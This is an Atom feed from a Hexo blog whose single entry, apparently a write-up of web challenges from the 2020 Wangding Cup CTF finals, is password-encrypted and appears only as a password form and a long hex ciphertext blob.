<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>c1ay</title>
  
  <subtitle>原创文章，未经授权请勿转载</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://c1aysec.github.io/"/>
  <updated>2020-12-13T16:52:58.522Z</updated>
  <id>https://c1aysec.github.io/</id>
  
  <author>
    <name>c1ay</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020网鼎杯总决赛web题</title>
    <link href="https://c1aysec.github.io/2020/12/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9Bweb%E9%A2%98/"/>
    <id>https://c1aysec.github.io/2020/12/14/2020网鼎杯总决赛web题/</id>
    <published>2020-12-13T16:36:23.152Z</published>
    <updated>2020-12-13T16:52:58.522Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="Hey, password is required here." />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="21a4ed26290affdd869ce2d9b80e880d323030cb29dd956139ff408761dba43e">d94e7cbc440f99a63c29368995db36dda74455cfefbb2c7ee88c069609b4634e59ede44e77bbf3d247fcd1c73626898ef19b013473b578b154a311bf49f659aea534852fbe0d49c9f9de2b754895fcbec558aea3546e273d03813da73ec31f5a21112694442e67d55d29b50ccb7e0856b2bf524042a039ee1a121a2abbefa745d8763b68d5b4c1301a686c54aa810f7451e1b937940b112bd2b64d42a896493be1c6d69917e9767588b318bdf78d0bfef405d0ec9561a095d41d5edb24a751cc49e29e68d6ab162d37d0d29ac044a2cdcf1ac9ddbe63ec812fd58085de1f1d368f410590fbdf9847a1b733e606917c501956b1940a0c09c5c19057572a420f5aacb2852b1289d8b991c918f7ee4cb4571c1cc874d9a544a82f4f111c5c6384ee19f2390d12c66acf397cd018c2ac52d48be9b9845832d0c94b94387b761ad7451df7b97d444e5094f77906aee1aa3c9d2ea604f57cd423889deed0d7285277f1c89d9b8df6f8e2e1c499117812b87dbbefe5d5c0caa72e4c24befe848968d7bfdf6e2a76bd4cbed2508c34d581f139d391efcdd7d8797c40518ccc02353e7f8721ca95fdad2d2f2b1a059af357f76ef7f1394d3a9dff552a701346c06104ae39be176ceb50d41ef8518018df3f008015839f7f52a0e2de73909d09667edc2069159d407720fc36b6821e44df41242b4c86ea5164bfb66c3f83314601ae09caca9bef4395cb30846b29af144946cfb2328d8e0a91f46a7cda6b52ae69ed59914b68be7e98fd9747480c698204a574bd3ab55fbe3da869b26bc8cb0beff94c23fb09f4d0182e9929105f831bdeb99ce4324e055820c181b1900eef1307380e3a2f0a213f0c5a957a4c53d049a5415bdf35c6b185f582e6c29feda5d6029da691d7cc0255b0927523990600738b94942cd86e66b8dd8a409e641373e175c28f7706de75b5a23c902e20944252be9531ea9ffb8481ca3e137ceed96c989b3b32cae8f18488efbaab37adbc4f64772de2b63ecaea2f880dd84f436bc7ea854f163a20afb2f64c544c473ca5fac7964ee8882f12ccb24b3f91577a8cb27ffef221cb32b7faed720f2005ae31975225702e60ecb489a965922b4e735a90a933b0ec03b2cd96f9962e4e6b33226ac9f21552f8ee09968e7e56a8d4bf4c751cf9e977fa72f6e99e782af332fe35de98b5a5671cd85aa73a0bbf707124ad1031f7503d59ce51d002ef67131186683794f0325e0c12485fbead14db367750c040a7b750aff9d328650a0bafa2edca7f8183b11a035732755446281a2d7b23946e6551e416905a37e2615fbc57a2c49320014982e7299980388a247931d1acf763fbcbc7122a05087d3ae5b860311df07dc460231f64e4536b9a9090b5abae24d8687df79581956f11967b5416fd80b5eb387836ad4d437c9c17701880b790031e541d86cc9dc78ed31c05517ea7fb0e10d1ba8d716b2d2349cc052b79b878a3461997785918070d41b502b52870b43290be1609ca8f831fe9d72c47075b9b169cf7f210c4563a5664b3409c8b3f1e895a78fb5a86a5afef355c8d0cd914e1d0dd185913668a4a66cb223559c4ebbb9c3f65e0bde3913c17d2b0fc88b17f8414f82eb3fa67fde6c110ccf892b0ebf89a6d7a2398e25bffe4f0101e7b0d76556c3781745cd98ac8f579d11c31e2f3d6034669ee3fb0c687cce1d08ca03fe9fa1dcb2b22dab7c413c28a3b79ce6066ace43b510139fba39b4b7149e338e151062dd9aa3f89d5e7085e2d7366b4866c56165f74054e8a77be3e6066934b6442864bfb6d650efaa07108d2a104bbf6043a5d1556ee43aab61f5baa28453fdbb5533c3f18695b1bfcc759081ae331cf53855917eb54ee9cd27c3b710ae2ee6be86d58afc09413f0836bf56305c81fade534c3224de67ee3eaba8cbe29d786d8baf6858678ef33320c21e7b1268cd5893edde846243a571fee68fb26b1fb927718bf47db3077f8d06d844df0628fa2a9cf677bbe35155148e68d16112ed65e4ba7b69d4a6c1b3b6d01a47fd19742b672e2e47c4e516bf6c14873d41dffa22b0b7c30f42e395bfd8f34bc1176e5daf66326b321566ee44ed0a3b431224cac1badbaeb6aecc6acbccc1770a08906a87d2d7e113610b2c9c8d34120fc5149d4f2fb86a8e9951e880b0c598004428d2f50d1469fcfdb1c56ccdb4d30d2c4da18f0c5b040c127b410227df1139fda1cf82c7b6c334a6ca197bb49568c073970c82dfe31b814e64f107723623b99866ae1034137a1f4cdd11db91cd533a063c8dfdf614740ed428fd165abf7421a486e6ae80afb421c1ae5c039e75f889287a21544093356ed0e3f82b1bb68ab94b530a37a4fea4b01c067fcd292d50c3b29b07865c97b59af47cc2f2e0430916e350e83699c0ce613d75cc7c68b5a5a6833db43a6b79f3243719195e3f3d6c6e8f61a6037339da7733e5a085a2c843725c262c4198fe577827f01d307909c068e6597b20fff6f93635448442ffeebe5c5feae57b64a8e0bb18af1c9a0c6b2f873fe00ba7590f0d50c095a43b24c5492add670fc7b4a6591f154ce9ec26e1c808187609c1652e2a111987da7a0ce0db02a0e98673540f1cfebdfe8a109ca1cd604fabacdf345b97aeec5ce180c6d04b9bd02f4a337b04e0c7a7b6025a3db831efec39e905927bb31d7c101fa86da161cad94917374b2468b9cba0690817c84ae55474e2cb9cd0f8e4bc92754a51b6525c74dc8a455729e2ff28dacb7a566690c7de8bdd282ba2d6a856cd4674627f45f7105fa0e33b41fcb5e03f0e70651136a2a3d6e33da943e8942cba1f5aa5b8b6585be79597f5eff4202d0a3927fa9b4879f1c1b5ed3c405b071ac42a39573971c2aacacff8c13ba1591da359d4831b96e24587ffc4ab5a7e61e331b7cec661d16e6beeee7850b1f41689cce60bceac015f2a1631cd82472ec15b63bc507a5d64194a69555a73c1b94e38e96ac35e460255faba24b0c411fcb5fb8246cb9f503cf5dfeb5cf5fec5ea3f87ae2876af11d013c91e3a8d48056625c24c22b9f18a83ec6f8f4ac6d815a2252e16c5be44d6becbaac5673f38251372394c17e80102f5a54623190aec16f3956b4909d98f1cad10b55f9c7b2121ec1764a91415b59445b9be9a56765975002075060f67a61df71658504b7772eb3fea49731d49e4851d181262d26798e3cbff5f3f92dd1cf815abbb40da48fb76f92aa7baeacf776024cc24325397744309f48e6e2bfa38e79f6aef260ff84f3b6c824763ebea0a4d41a1f419d6eb2e73d781d36707082e57a6973c3f50f5756cced277f1edfe6dae3cf5615930c7dd9f355d4e95909abd8a31eb42ddb34d2b063efbf50df5094f432fbd05c346dfc885b3cd84849c427be7a1253f25e10c013fc8df4301301a6edb919e1548958a81b6d0baa760417312ef1e32fdda45b46722eb4956e78434cf858fdb60a016ea43fc6487295c0a5198223576ee5a695b6dd96acb345c6643f74ea7e9df235e396d387b01c05c9d9ef8f9b9d0a533291f59710cd68aeb21de1797d82aa3d9cd460f8344f699c49c51db0c277d10e2db846a6257338240a803f29eabb3e92c87376eeb394f68cec52cef80f05fe096c606b967c1347a550763195d122a03d9990d299dd3179b376c9beac8bd6deaefb358297e7fb393d8cb491622b77f0679e56b4725a9bac5e2568add7516cdae46d42cda2c7d506b3d3416abe8409e26e8a2e07376491f2500a82d5755320e74a2675c322215a8613bc1e0741e34c065be1ee6312f586791fbf3f28c31324bf0afe597b2c9342362ff58c0922af81ef6592ab898a27f07afb4b4b4f80c2cf0281e3158a34109a237da247d02ec7c3112b42e19d98a685c4167eed3eca83a833b27f044ec451b8e884f8267841283bc062113ce8ff6d0ce8548deb7c51de6cfbf943023565e0adbd2e626be8cd2d74bed99c298f4e23d4c1e4e8d2ddf5ce7ac966431b45b55b7473de522d65b7515218b6289b35ca25f662009815cd3f0acc3062cf3fa4387eac02b3e929ed4b6ab677d5dd4b7ec3f865d9a2fb7c5fc2a0bd685b761a0b831c4c3e7d9e3df36cf2276415bc0ba781e8cf63ae5a9d52c171b95ab321a9b3f8649b784809269a2db471a6c441cbebba94da80c6f8dc0c84be0dd66e4cb78d3de782b3b6c37042527a4945335da0e97723b77b84b30e668c57cf8952fc89b1aad74903032ecab462a1855099f5002ede5f371a8dcbda0c540ad6fb2f571cb974f8e4db3ca39dda2298b41cd056b7c0a942faa29081ffcb7fadb6fb6c6aa78fdce5215baf7c2d99e52a9ee984a69ce356b349a7efa4485468ff914dfddb61fee4c7a520ecc715cc85140cfd55cf800383ce233e1771f9b7d48a11348a92246f00c5cbb3ebfd1335cb318e3e04ee0bc9891cafef206554045a124cb24f0c04b8167406dfc6fdbd155c2d39d5df2432163fc197e165762c468699f16fd61a2efdd763415b82f851aff59e124c4ec534d5eeaeafa58a7d3012fdcf9223b497b9e34d4a959933ab31ba1e6480baeac931931d633636b76b0cd3a16604c2540effc1cc75acb271b25ae41ba3c54d0f94b08ae37a0a4bf3d861e08a130e1e73f60582c54b0fbc51c27cb13913a46f2a983cef6bbb9d676418cc1fe6eed68a833a252749a18e520ffe0db8839139d6d7a447ba672f67e9532687bf66230a55ec5417e8a7df023118b29d73eeaf58d9f6281155e16da7f82fa07a3dbad9b6d0aa02d5481eb4fd81cf944a1ce7895e3cb217cc8fe2994cfcee50525a743fac8eb3833df7ee31ecad48a488a2191f2e2a50a03ead1ef0b3bc2697c2145fa2e64a994a40649f07d8d1391486447fd830de62ff6c52818ced4d9bb3a7a45c6a3de1712dca450262ca2821a37c3ddfd965b6c5084f3e18637e1199da89c43ab7faf9d2360b52c9a0d3e8c40b05582a91d3829dc0ab94c8fb84d7a270c378ac5d9a2e99b5cab3354020e0e239b9a9c253001703af1ea4374ff1f84d43e399e99a98f46949277ed457485b164b2a69714277a5ad9a0b29db358658df650b47a9273bc61737e0578515d76fdbd0ea98483e649e4a6f899d59ef20ff69abdaa839c9441166a772a057f8319aa2fd12b407a597813e2dcd567ffe080403985c1fcdcaeb8ae9071b7ba28e3b7242074b26fe0c70630b27fc6461a2eef5c97ff9b081fe4575bfff4c9193c7a8827af3e56895f8192e783eb0fcd0801efaabfbd301972a30ab1e3f65a05ffe89fc8028527f1f2c0fef89d23734d3beac341997fffd73135c887e8d77a5b44cf3430ab40749ce132421a05da7a7d783bda1e957b7da93279198b0847cdee28e724f6346263155d5f829a0f5b38ecef9b7d548a163fbfbe09be1d0c05c07f1863cbcd60e75c12d30daa43130743d09ab8f6b76fdf1637a92a88a6c01c4dbc0c7b506d1a18e1e9ea537a596166cb88a0fd541d36af520e9d4f9be51d19f8e8e7dd475264381cc8ea5eb3537d62631c5d5cdb5f9f5390f8f0ab9cb4351e4846cc681f579beab0e5847ff8f69c2b7c3f146c844cc14db13963275f247166903ade6a8c0e1a39f4e4c536948b10082537c57f1a6360f3653a1b8413d7e4237789c4f5e0cc5ba3e76d05467b5c6efcd398c656df2285cc7bb49098e3a17658e409c6d888d72dc74677feb069698563ac43ee3b08749406a47eecc048714445b79800909332b021196848ccea84e9a38bd0bbc39789954178f1c6cd4c50b641f305cd83834a4670e33987fe417018a67dc6de4484dba8107bf29bc5a7ce4e476c6d8606f587674c13538608254b9122654f644882ebba875cfbb555690ed68b34ba58002485f67365adc0b7e52f3d30922273ebed409197011e81db0d30ec658564842aef6361395b839e3e72dd6b840dd1c0249bb03b86e48d8c5cabf9f84423e251116f194fdc2666741fe17db836ae0ed9d5542d9082462c69e51ea164e1432d8e90bb8a7a368b633a80bd1eaa691a3a3e788412922e85eea6d68c896abb228902933b464db70ad10fed677b29322ed8ace183f352cec43ae2b10d8042798b6f8935572cc473c1a4eec1dfab8d687cabdb2285d84fffdd616d937c4ff3cf6df99c2baf2bb8b978d71637eb9be7979f57d8a19c4f4cbd24fa9b3aef7abc2196ee6843f6842fc88a5663188a3960b0e595eacfc4848c5b897849a1a840748474028be30b36e4cfa96d04b6fb8d3a8f2eae9bb9e45b73b1048cbcd47dd5617a4c53547ce9df6c52bec0914ea689628fecf2b28c9d01a6a86ac5c7b418d6dc7c92fc26fcb9d1b0acbe60f9491be00708251b7dae8eeb47e0ebb981126d047ed4bb73951cb7de10338b58ee82b106900cbc58156d116734177157b4daedfedbd54937a609e3bb7d58c668c5604b32fbd3d8522aeae5966a69f41b68b5ecffde46fe7edf1cbc518e85d9f5fcaff128e2ebd282c3b934418dce912e21f1365ba1d0bef2de000d47055b69c824b40759ddddb6d6d05ba555c6889aa4c824c61012120487bc956d694a606a5e59dbdb1b03d9f400ff4c4911d74cfe1bbe6a26178f57765d904f9e33b760d5741b5f1d134a8ee852bce72e2b5c5ecb4231b3b5ea7f4acd1d04f5fa3130638626a92943878a8ff1deb07dc07f77e082039a6c86747f084d346d42b43cd1c00c10c184543ea07d965dd816ad93baa4a97d6ed7e0e89bbfa9cef6da863aef67acbc278a441022984eb6940d07a0b8f0990e9b353f53924e4b397a7244f548d6bdc41001c8be5b96f0b4dbd34fe808d2f14704b04bc832544675380badab2153adb9a9570cd163911a95dbe16cff73bb78753e3619ac2d2e58a2215dc7a4da46dc7b5dfd54e7f2ded46193b814fb0746a2f6952f038d9bce6fb9478ae07fbe1478c8cc31a9582459f5c8bd951021c2064368371e7edb597563cca4591612daeb2a52f211970341f5f5160b8db9e877bc8b3d0e05c1a645fab98974888278bb96c1137d0b9295502da2160168839eabdcedea87ecdbf88b0e4b06c55642d60285b961234e1e3b809aa15991e9416a981667df85545cd5e00650e4e3addab7ace1f163ba05761d075b9474c8cfe311eabfed2ca9030e9f30d8a96dea6e2865097d7b867932ba89c1b97f9142b2209a5f700b4a0912ec5b6d75fd356b313ef779cee1f60fbff9bb8690e4211465a7e5022e190f46c0454310452706763d41e5c762289a20a9360ab39ba1a854fcf5e21307c2273d2bfb8df09d8d1457b78973af52905d3d7ffad0708dcec8c3ca242a20394ff2ad29f522fe2065decdffe16f9147cc70633dd0fad8d1f726333e4f32e55ac4fd0d69e364aadb5be1a9a37cfccd0cd014c265e9327d86360231c441a86f4a906b571f5509ffc074c56748a6fba418ea9fd266b084243e65c320aaaa09bb5274bce60cff4a0209af05d4bb9e5d4bdfd9491404928f3b27dfa6d267648269a1d2e00fabe062f7fb2e54d18ed8f7b11514266f579e98a6cde17e5edec1ada90b57ec259bb7ff07d6af24ff64112291d0e1f196208b92b63ebad23b651f2c0835576d5a25965d695fb008d82f5feb73cd445118934cfb313f81744fd89b976334d1f367c7a566b04126e78c12b885511cc91ddaecc50ac5b920ab4cb1d381486d799b092358d88abb7cb97984f14efe35d3aa5f615758cb7e90249246592f7fb733983ff994f78f9f223786f1f101c73007127e5d8735a22ea733060d6facf27b65b0c86afb25544b5a4726c909ec5df23b584400b200ff198d8488dcd977714be0b0bca6a663fdd0c3aafbb9e8517ee33b955c41cb065d2420f60ff51902ec786d3c6a90fca4ff63c4f6306fc3e8bd8a408a77dc91983cb5e958014364e5ec9c442c472449607e955b2c37ed26d89bedbaa1b14feb31b31cb589b31ef6748ec04c33dc669388ab9f8c36a0045eac397cafe845ab36537e9ee8cdbad2d7abcfabdff6270b5293a58afa1a5b8e4190bd5f6c2d3ee7bf0dc98c259adec3fd998fd1302b4f55d45688daafa1b6f63651a2251f015cc5f5be431682a07c274dd1377d166d516c9d594cee3158bf57baf9db2a01d5f5999f9bbe038eb04e5cbdbd23c189cae844d68d005efa73210b25b5628d17596d1e34fb418cdb57ec38e1060a31fce8842af6c3df6f4e2bab9e09b049ab065a79fc2b2710411f117124b5e630dfe5321a3393adb2d373720997c0f3023b6cafabfb9b03ff4447699fe95da831d592612abeb5153278e96ff58fc09741f50473a633576c28d177e7a4853d5f6621d2da0f433ceffc2c86c96cce1369e8092b4f5b5bb6c08b2f6adebd154293f459a9f1201aa7098b38c5da6f2c94587ff28c6322c181aa37c0ff8ce9b4fdca5a7e6803b41f03ceed1c2573a8c52220bb501127945e0a8b6d3c57a1232874a0c2b977513244e3986fa46255e04571c8167f430aad61ee05d6fa04f7892516d67b8906a91a5b5c970d12924273c9f8a01807a8d5c3559e62282970fa89ce4bec6007e03ed04a5ceb743c5171844ab0eb63889d670ad56aabfb11b6873cceff3c1be01b6b7972e76e03baa83f68908a7ef73b6f68afdbdb06413cd42e22b42dd9fcf09f9a60826a105297af29abb5cf2670e982e23fe48f4e1dbbcf68ab6fe15828405750bbacc8b1b354d0fd436a8a32343c740e73aef79d6d6eefd20a011b84698ce861a2afac4fdb4fee93ed7fa8f993a90d950926dfaffceaaa99f163f0dc91d0c0ad24805256cc3afc2fe86a00853b5b9a863af8d312d7143e28128ab6fd16457439a575a354158a3dae07dc9d99cd7dbc7209af6b36c3a5ed0fc2e8f329eaa03b90d46fbaa58c46e356fa98b093319a6f1287237a8a93e8027043e50143a5fe45b6dc9b6cb9eb2cd4955e08c535240a5a47eac94f7b07a98c261fb58698244e1c97f468fdf8ecfe8f0306d5e1a542042ba056ba7dd821b7f0e213dbe084b6a088c3a918e492b36434cb7d6cbf0ac7e3d2aae4756ee2a19d035d6907def11a030a139387f535559481a4dfee2271069e0fc19c69d5203c5f8dea4970d9409ee9d6ed7c4e1897834e6cabe39dc43f4015e218fe4a80dfcd000ec8ead31d7adbb0b15fc6d472f1072319e4d9fda7ea4a617f1af5cfa2eb3c7d93e3956b4985b73b9860c44d9e30c421c57f829c2eeb89c74376d7011292026e49a7b42afdea773fba06b9b2100f75ba19c6ded9d05ed40cb7e230cd91824be48e299f9a0775a731a418d24fc909143e2e03f83a9c80293418fefea7b29e53c3f2444bd5dcd42807ad92352d9b5e9486c6f084fd2e276c02980c56d184ab1ecee516c146733060d6980bfef26931482336b798a94683ffa23c9559cba66cd2a35dcf71bd017b7983abe8bfbc47135a3e3602d2ec965954b17cea774d1af9000626ed50546b2ee1f7b9aeafbc53b1e947af824ff86d8fa83cb2ca8409c83cdf135b841dcc21c45d0b16644deffece1b0f302f2e54c65963e35b2b7eb8edd52a552b8ff8419e22bbf84f2197c3813d501b470fcef25e1d347255715eeb4b2e43f64878ba17fcf79c2fa110eb2da55b95f3a59390dbca85403c527a7b70a79ae18308b29a0242b74a6ea580877c0c31fc562ba88e48a3d3d9795eb19368bae132554a3490a2d58e49b119d776f91138de23a9e33b21ccff1cf840143f40324395082eac2a5be5af3cabd03dd66158e0a72f7a71d8582e02db10ca93ea99daba4993d7752af740ebde2a7ca9ca762514f90cbdecda65648101b9a55cca2a097b998aa42f3f46903fa06cb2816687444eed7b41bbe6185e513c40c4324e73203800a3c20113e61dfaa6e1cd171869f57b223e4a5b8c8913598da869fe628b63f75862a396eab1d7f051a32a8136c28988feb155fafbe02a7603ff1826fdec1f193062c0946df100f15ef294613f7e83b82298afb1364df5d61215829db4e9147c34092b994a735f84d7b858f07f2d37d3fbc4a031c418dd807ecd7939ebabd1adf204e61d5b31c0dcdd26fd5b33740643e3a1fa4917d85c6bd7288b6a8469d85efba0780cd65dfb8a51c8a125995356081351533fb899af4ec798f3b2c93e784ff1e477eb36b481b5f50d4eccd83f4625c799981edd4a1aec69fc1dd8ab8c3c5b4d9edcf77dc3040de5a1564e7f032a53d20831f0b38e9dc06a59c59a9021cb68282439598c2cf44c38315423da86467405cc2fb45d877c328e6112a902652badbbd9755fc16047dad71c0a9e64100ac6ce34cf3713ece14c825cf14123931b09b77e8a80ed60e4c61e1389ecc7b4dc1e932df46facb7fc587bc2f4b3c146f50d75fb4ea76e93973e7d0593080352618c2619b6e5249644ec06c564684571f5fda2c2818705d6d8871becee9d622e9f337010886f084503724dda06bc708fb1e0e70f410f0312ed954a18183faac515811803b2910a3d3e2c9ecb8806fcd95aafdb38dda6fc75144583379e1459a09fba1703af9eacefc2e650c20d4d6ddfce2083fc6fd762c80f981e79171dc295db5b818bf46b019c4de30c9454d6953ae5281dea90044fbcec0dcef1b1c2471ee06a4f76de850478bd429e47d36e97d544c00b1cb323886f23a93ccb060d0c776407b1510587c4f321b14e02d1cd233bbe825be1e7162e2a41f37d89ef1803c7cde3357ec616dcaa892914a4c466c2397d414e8e621e364d0caaf0deadf4ecc7ef4bfb361fa189f5866cebe885f4430dac92d628269523a408076024a032c25d1a3fed6a26f8cc4676c7b967b99d1b06b1eb822a28f041f3563198cccb420f12a4ea7b5b48d738d43706948c6f06c578358006f6ac322ed103634b07accf46c3c1b55efd0a1fa3b0cffa203afc1c80a05f0dae9911012edf276d6929c6b7664d9b84aa154007643954edfb3a0bca9832c2abb7b3cb081f79887e85ea090cd495aebcc054c8dca5d99b3f97223ab18a48346ee3a03b3594eef635cfe0592b626d64c30e2b238b66f5aecd78b4c7b50df78709f81f1a515b1e74b00a1b55ac601accd904cdb176552539617053636196afc3e30cc7bd273cc856fec376202a401a2f55aa33c9907c87fde1ec2d1053c97fc698bf389342cfc25386379cda658efbd98c0561b545d4d8ff670cdbc80e2f6c3406f3fef8e4375f405a5faed255e3e4febc0ff550d0a2870aff1f48cb8dc0f56fd11488dd56b0faa04434f409f8f9056a5768df021439943d51803fc420af8c495d3acb1a929b8d7506503a65e1db41dfdf9897cb556b3a61342567c10b8f6d3be551282ea6f8bd494df8c79236c2a7d72def8b6b260bca25351072b3f5fb86f32ceb7768c122a5d107a5625c2756ada187098b3d742b876807331a7f4fb5b8490f4b6d9355f35c5bad9dc7c91fadb511008c1490e83287046cdb0a3fc5b0ebb7892e2ae6177e3a6aab5b2e4203c16aaf0e052761c663cd23b37cd0c801be8d5451f3f54777eaeaf0a93d2d11ac2922d9e507643f176500333175180e302a2ba9d7afee5b6ec3452f76351b5f6cc8054203bbce5b9b80f53981d1583fcec2f668a5c3eba16086888de9c199d6c2b0fd51d363f58f793478d63e9359abb23e61bbb34829fb90420e96cc609dd3e27854df27ed8fa8f96a3180c872890b98927aef5496df975405f188e84b595cb9ffbf70d54481463863a60f561a4d9ad79bb7be72b11d8779fb48bd597ecdcd0fe70361aae9986634cb8d3f3107cd0332bf64a6b5c1af4e7f48f4478f3f543578b9fafbc71cd6e67a53e6785d3212f453510fef576617df46ad93ad7db48fb75d6da0aec845a7688a7a1bd9f6965a3b86b2343abeb830b63b61cb322b3d72a3f4e557206755d398449f7572e249b304862bfe295407e9c48a511ca9ba10b69c2ed8976b7e9d0a1a4ef1af9dbb645ce5c20badb2c40f00a7826e94d1b32a5b90c3a0c0e61a3054c389a786831fe6d343abe2f5a2fbe4ec1b79048e85ad576e38b2403fc44a002e06ac255963b214ccf5b13ab93ee8339faf36358c5392c557575eae56f335765ca2d06616918c846648418e0fa3faf25ae722c2427fe364f20a1c4bf2d3a99dc659954490c54980633b5d7ccb099d58ef799d871b4cb5d81606d8c7e2f061f8c73b2dacc15cc9c47be34d4bf5635465b8e317d1a3f39cb81a5659cfccc9484157cc1cb48cb44ca7bc2c6fd237558197a8910050fed3853074d3e5f94e462fb3eacb06df5bfcd69b81474589fbe949c69f051397c09f46015f19f10be3665fb52fbfd0bab9d9bb2beec6fb9453f21a98db693d7f2454c58336db08536ad3d8336e891d910140f2a4c519833b2b1b0c217fd052317fc81f4a090c05fda23f0e0b613fc7cc99108ee60eeb8abb3e9ea9b8fc42fd4c541609ccbfc19e6e2c0485b17b3b3e6deec2ba63c0b1223e2c3e401785c6588dc66cb7083b55690600aafbade321acdafb0cda599404d101c35d663572f00ce6238effe5bb8866fbe41cce5e1afa2976da516ec855106bdf47af23219e60c81e97b0380f6f89c198a7c6372c763d124404db09d0f416d1c122c1dc496da2aeb05994d21963adca84a554e475842a1081209e77dceabab5ba355e4d7476412960caed2aeb3715fac643fbdc1242d8cf67341978dced6262f773703579468e9e600c28a504901d3be014e65640459ecb005c7340831c6fbe66ea5e52d0b670d3470ede2629b6e9e167dccdbd25fce3134409a01f46e804f96c33b452b181882cc63571ee155be295acf15624fd5558d393ddf65e805e76280f2685a6453b2d89a96d2dbdedd5cbf2c05c1464a7f935bc9e40b513cd1f606896ed62954c52d81337fc0368c9f67ddc8678d56f158dd326a59e4bd76165b9ba06c45577f04cc6fbb53bd8cb0bd2de5a780682ed40554fc2d5984c050f431379babe15e612c359cd379e9c3b3bed977b8f47a605c6485a153da1fa7dc55ef08cee709e70aa6c936168b2999c05f1ad5dfc3f23c608af978ffecb84d864fa6d16267b29b280b37da9de83e65b639532e7a763c24b419bb30998202c88a835a971f9839cd26d8c7273c630cde794249fb09efb14d9fa42b9d1c10af92872023c45c58c6ca406b2a4aeb4e42c634b2040aecd6864abeea92eaa474acb761b99c0b4d8eba119c17ab3c859e6247d4ec84f0320d8ff50d4ef1db8410443e0c8c55e7b1e804f19f33f983a0f526c818c5f62d394db10b417908de697570c25021a38b8755fc7b0053bcc4f5a1ce3dbbe2da393e6985b9cb5016ed5035a828434fcf971cf46a3fd187153a6a734541ed47c6a7a5daa2690030297d4e52f8406e584ed3d2033e259801bc8064a28d75a14ab5a7962828fae56813e4699c0f0499f218a4249f6bf7a8907a7b1d1d9e1724d2d7753d933d3878782f83590994d16422508293e750c47cda173b9370646d3b16d73d3da7c601b0aa4db858a3f1a3267ee146bae252381b1153c629456f600c744695a6b236f6117057469b6ec9eea31eb37d0c51911c6f05acd4ccc4a47bc831e974e86cc53fef69152f1553179d723058bab2d64e06fb8426d38fcbe30f6855b00b3b0fc3d64f860e12b0b6308960763e6c2c960dd9c9fe3796978cff0c79b52c1cc6560a3602d91c3983260756d67eb1e9dce2857b351c6ef1698a1433b53dc6081c88d246b3b1de0209c1ee3e9b1009b1237a3630b0592f1775a61131fd36c482a5a9e883795e8be75ab7dc967b32467a08b0ef5f18e3fa6afbef80ea7143e32da9aa494264f4924a428b2e538fcbc4acb5165148f8a98e8676f7996e93bddb9dd79cddcd68833e5d7162dc75f694d95bef080a1e8a5bdfad915b68431d94916b7daadf2e15475e4fd9ec20e8605f890be67509dc7c16e483f6baa7112689c6d8a96cc89e6af3839f3b7f1b87ccb880b65ef411a251c3712d8b376b2ce3b5f8975c87c46c6ae3773ed35b469e13984ca44dd8b6d3598ca564d72c68bd9fdc111f8fb5ec861a148c76694822e1999e88039d39c0951aa185edf8015888ce0c510cdbd979ca8094919d907689cc13bda9922c80576519e4c69d328e4eefb584fa1f32fedbfc77501bd5f43dd2e21ba467f9feb5b53d5fc5c07704209fa2d2664f3d179ae4a037dd2eaa2ee357d79a196a7e0cd27472b9e87ed4f977dc8266939dc4d8ffa7d3a5183da13f694676cc591f09e1eef8f68eb1e2bddfc60a1529ac3dbc7aa260917c485de89e77221839bb417ae17c76efe34ebd3e6e755c8dc827a6de4a9292b532431dceb98d23aad658c8778790eb5e121fbb84dbf337f0d782d712df8cfc5287bcd18e3ef5c7077e1c9684f04e6099d001719462b02632c1a598f2ed9eb0b697c70f36ae9a6546222a1792f0c19c11aa5bc21119efd6dff5bf08d2896cae11e87ee567a3433dfdcb01936968ae18d1eda74dfc6c202af3f7ccab05400df4bcb55517b5cd6b327eaace07c7659a68a5b1dddfbc334bbb52b7eca163be5558d9b17f3a1c9168a66ccaa47b6df080ca5a3d37682fd8d1c909467276855f7ab69d4e1d4cd8639d6c9b9a65b9f81e3e28b898d1319b0169765685c2d41f672bcc4eb87e3ba3460afc4b22faf715ab74bfd38462badd380956c3a27032bca3f54a18cdc57778e19c61bfd4cf323bb81d08a6571fd58ff9ad511218f54713124da555eed843a28a923d3f42a8138f70b4daa68810012cf5ca96f5c1caafa046458884973458e93026a8cb87a55d72a3cf6564051d2471da563c55f51ee9f8120688018d256c9f92fb9303f6689dc73263ea9fb2ec3afd72f9cf14e796bc4f8ad1470a75c8971372725ab5f05415177775f1dac63c64c170983ac5264521be6610f104bb66ed94e150e0ddce9956f71f3563d8f9da0db94849b2b836ec443af06dbfb5db888d4696692e9c4d3b0f9e3da20fb2ec66174d5b061bc1b01588a719cdfcb8460edbccaa69ba89ae2ffd64f23ead226ab396caaeef1c89964246374d79ceddbd9f19457cfd63a4be6c7ac9b04a8bbeef61b660eb1f2d3b397097d5120a8c15795b1c2927ceb936d0082c13cf5107aee7342532b4aa44da9e6771b9e3ff5278f110d55eb72207aafd46eacbf6f81807673939bc663cf69ec5aa6d520015fd8cd2267af98cd476f1a3012a778a4a03e6ee211afcd268a1ed53e4ddf7c41bd4ad4d5ff3089e3ff3969ca87be995a5dca9f6b431bcc9204ec68ba25baa457880d9e339a4d87910485621f6fee59b28b259db291dcfed5311251d2847de5a277b5f0dfc191bbef5123221ed1f9c5670912c21d5e783da43510692a4139ec32d8c94b5933b836fb436633efb487f5af7d589839af308b625a8f6500cddd3db298cd7dcb5163eb8fa69f05eaa70e3d4b805f1d7956e406486394f14f891d270737742b11178d7fd0e362fde49a2099a30190444a4617bc9ecc5c7a76ffcbc7878d2b1fa3b27cdbc6b855a381f02d21c2a4370bc7565a5f3ad60aa33708040e3cff5974e1574b412a0829a1c9d6a4240d968ec95bce9220f44da65322b610a1ed6b0dae3722b135d34dd1d66b182a74fef43171960af2df4d856e99e67b7ec867f3ee1c2d0224b30442dd77fbf043406f0e9b64d8afc6fcf07784efd513836b2e7a630bc4846f30fe3788064c021cb4fcaa0810ed5984793044c7dd89f9c1eaaff860e21661adeaf3910aede4934f1aff9fbf69f502087f